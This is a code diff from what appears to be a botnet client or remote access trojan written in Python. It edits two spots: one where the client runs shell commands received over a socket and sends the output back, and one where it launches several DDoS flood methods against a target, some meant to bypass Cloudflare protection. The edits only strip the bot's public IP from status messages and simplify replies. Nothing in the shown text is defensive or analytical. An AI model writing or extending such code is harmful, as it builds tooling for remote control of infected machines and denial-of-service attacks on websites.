@@ -2050,12 +2050,8 @@ class Client():
             status = "ok"
             return output.stdout.decode('CP437').strip()
         out = shell(instruction)
-        numb = len(out)
-        if numb < 1:
-            self.sock.send(str.encode("Command not recognized or no output was obtained"))
-        else:
-            self.sock.send(str.encode(f"Command executed : {out}\n\n========================================================\n"))
-            status = None
+        self.sock.send(str.encode(out))
+        status = None
 
     def download(self, filename):
         try: files = {'file': (open(filename, 'rb'))}
@@ -2163,28 +2159,28 @@ class Client():
 
 
                     if method == "cfb":
-                        self.sock.send(f"{self.public_ip}    Attack sent successfully".encode("ascii"))
+                        self.sock.send(f"Attack sent successfully".encode("ascii"))
                         LaunchCFB(target, thread, t)
                     
                     elif method == "pxcfb":
                         if get_proxies():
-                            self.sock.send(f"{self.public_ip}    Attack sent successfully".encode("ascii"))
+                            self.sock.send(f"Attack sent successfully".encode("ascii"))
                             LaunchPXCFB(target, thread, t, proxies)
-                        else: self.sock.send(f"{self.public_ip}    You Need Proxy File ( proxy.txt )".encode("ascii"))
+                        else: self.sock.send(f"You Need Proxy File ( proxy.txt )".encode("ascii"))
                     
                     elif method == "cfreq":
                         if get_cookie(target):
-                            self.sock.send(f"{self.public_ip}    Attack sent successfully".encode("ascii"))
+                            self.sock.send(f"Attack sent successfully".encode("ascii"))
                             LaunchCFPRO(target, thread, t)
-                        else: self.sock.send(f"{self.public_ip}    Failed to bypass cf".encode("ascii"))
+                        else: self.sock.send(f"Failed to bypass cf".encode("ascii"))
                     
                     elif method == "cfsoc":
                         if get_cookie(target):
-                            self.sock.send(f"{self.public_ip}    Attack sent successfully".encode("ascii"))
+                            self.sock.send(f"Attack sent successfully".encode("ascii"))
                             LaunchCFSOC(target, thread, t)
-                        else: self.sock.send(f"{self.public_ip}    Failed to bypass cf".encode("ascii"))
+                        else: self.sock.send(f"Failed to bypass cf".encode("ascii"))
                     
-                    else: self.sock.send(f"{self.public_ip}    Invalid Website Method".encode("ascii"))
+                    else: self.sock.send(f"Invalid Website Method".encode("ascii"))
                     
                 except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
 
